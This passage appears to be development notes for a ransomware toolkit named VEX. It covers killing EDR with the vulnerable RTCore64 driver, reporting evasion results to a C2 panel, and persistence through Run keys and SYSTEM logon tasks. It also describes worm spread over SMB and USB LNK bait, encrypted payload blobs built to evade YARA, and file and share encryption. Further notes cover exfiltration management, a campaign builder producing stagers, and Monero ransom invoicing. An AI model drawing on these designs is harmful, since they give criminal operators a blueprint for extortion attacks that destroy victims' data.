  copy when the accessibility shortcut is used on the logon screen. Removed on
  kill/pardon along with Run keys and the task.
- **HVCI** blocks the unsigned RTCore64 driver on modern Windows; the EDR kill
  then silently falls back to `sc stop`/`taskkill`. The driver path is gated to
  the Windows 10 2004–22H2 EPROCESS layout (builds 19041–19045), refuses under
  HVCI before dropping anything, and reports the outcome to the panel
  (`/api/report`, kind `evasion`: `byovd=loaded|blocked|hvci|unsupported-build`,
  `blocklist=on|off`, `defender=...`, `fallback=...`). The report runs on a
  short-lived thread with a 2-host / 1.2 s budget, so an unreachable C2 cannot
  delay encryption.
- **State guard**: if `%ProgramData%\VEX\state.bin` exists but cannot be read,
  the payload reports `fatal_state` and exits instead of generating a new key
  over already-encrypted files.
- **Persistence carries arguments**: the Run values and the SYSTEM logon task
  include `--spread` and a tuned `--ping-ms`, so the worm and cadence survive
  a reboot. A sub-minute `--ping-ms` (test cadence) is deliberately not
  persisted. The logon task is registered from generated Task Scheduler XML
  (not a quoted `schtasks /tr`), which avoids the command-length and quote
  limits. `--persist-preview` prints the exact Run value and task XML without
  writing anything.
- **SMB** uses the current token only; no credential list yet. Remote SCM is
  filtered by UAC for local accounts unless `LocalAccountTokenFilterPolicy=1`.
- **USB** relies on the LNK bait; `autorun.inf` is dead on modern Windows.
- **ngrok host** is burned quickly; move to a real domain behind Cloudflare.
- The C2 runs Flask's dev server; terminate TLS at nginx and keep `/admin`
  off the public interface.
- The loader only covers userland: kernel callbacks, ETW-TI and memory scanners
  still see the driver load and mass file writes. Dormant image obfuscation
  (`--sleep-crypt`) now hides the mapped image during sleep, but heap/stack
  secrets and the helper process are outside its scope, and a crypter/packer is
  still missing.
- The appended blob is AES-256-GCM sealed with a key derived from a
  loader-embedded secret and a per-build salt: enough to defeat XOR recovery,
  YARA rules and naive unpackers, but the key is still derivable from the loader
  under a debugger — obfuscation, not key secrecy, and no substitute for sleep
  obfuscation or memory-scanner evasion.
- `--file` mode maps bare payloads; persistence then copies the loader without
  an appended blob. Pack before testing persistence.
- **Share encryption is implemented but not runtime-tested** here — it needs a
  second VM with a disk share and matching credentials. Local enumeration was
  verified (`--shares`).
- HDD pacing path is wired to the seek-penalty IOCTL but this bench is NVMe, so
  the 4-thread branch ran only by inspection.
- Intermittent mode raises output size (5 bytes per chunk + 16 per encrypted
  chunk); the decrypter rebuilds the exact original size.

- Decrypter 7.0: x86 + x64 builds, `--selftest`, hex/base64 keys, FR/DE/PT, drag-and-drop GUI, backup/restore privileges.

- Root role: `VEX_ROOT_USER` (default `root`) and `VEX_ROOT_PASS` seed a single root operator above admin; root bypasses role checks, only root sees `/admin/root`, admins cannot create/delete it. `tools/root_pin.py` and `tools/root_reset.py` operate by role, so a renamed root account still works.
- Local TOTP for operators without a phone app: `python tools/totp.py --username Leo` prints the current code from the panel DB; `--secret <base32>` works without DB access. `--watch` keeps printing the countdown.
- Decrypter accepts repeated `--journal` and merges v2/v3 journals.

- Campaign builder: `tools/campaign_build.py` injects a generated `campaign_config.h` (host/token), compiles into isolated OutDir/IntDir, packs `dist/campaigns/<slug>/stager.exe` + `stage.bin`, records SHA256, and restores the header. `/admin/campaign/<id>/compile` runs it as a job; `campaign_selftest.py` proves host injection, footer CRC/HMAC, and staging.
- C2 additions: per-action permission matrix (`view/chat/operate/finance/...`),
  root TOTP enrollment/disable with backup codes, exfil v2 admin list/detail/
  stream/prune, campaign negotiation flow conditions, invoice history + Monero
  QR, and a dark decrypter GUI (gdi32/uxtheme).
